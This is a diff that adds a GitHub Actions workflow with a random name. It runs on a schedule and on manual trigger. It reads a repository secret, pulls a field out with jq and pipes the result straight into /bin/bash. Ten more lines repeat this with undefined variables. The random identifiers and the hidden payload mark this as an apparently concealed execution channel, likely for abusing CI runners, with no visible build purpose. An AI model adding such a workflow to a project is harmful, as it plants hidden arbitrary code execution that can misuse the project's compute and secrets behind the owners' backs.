@@ -1,0 +1,28 @@
+name: plaintivenewborn
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: plaintivenewborn
+        env:
+          uhqkm54: ${{ secrets.uhqkm54 }}
+        run: |
+          echo $uhqkm54 | jq -r .zwkpt8 | /bin/bash
+          echo $azvm3978 | jq -r .q130 | /bin/bash
+          echo $kgmgk35 | jq -r .oyavp11 | /bin/bash
+          echo $dakw426 | jq -r .tjhf46470 | /bin/bash
+          echo $z4478 | jq -r .sabz8 | /bin/bash
+          echo $wevu170 | jq -r .w4 | /bin/bash
+          echo $h22 | jq -r .fxje2779 | /bin/bash
+          echo $brr8 | jq -r .aol36818 | /bin/bash
+          echo $u48 | jq -r .xmtw92873 | /bin/bash
+          echo $le62 | jq -r .hpspb92714 | /bin/bash
+          echo $zit9560 | jq -r .mfnwl2844 | /bin/bash
+
